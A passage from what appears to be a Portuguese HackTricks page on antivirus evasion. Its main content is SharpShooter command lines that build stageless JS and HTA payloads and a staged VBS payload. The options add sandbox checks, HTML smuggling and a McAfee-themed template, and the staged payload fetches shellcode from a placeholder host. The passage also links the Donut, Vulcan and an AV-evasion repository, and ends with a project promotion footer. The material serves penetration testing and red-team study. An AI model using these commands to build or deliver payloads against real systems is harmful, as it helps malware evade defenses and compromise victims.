SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload: 
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut: 
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mais

{% embed url="https://github.com/persianhydra/Xeexe-TopAntivirusEvasion" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
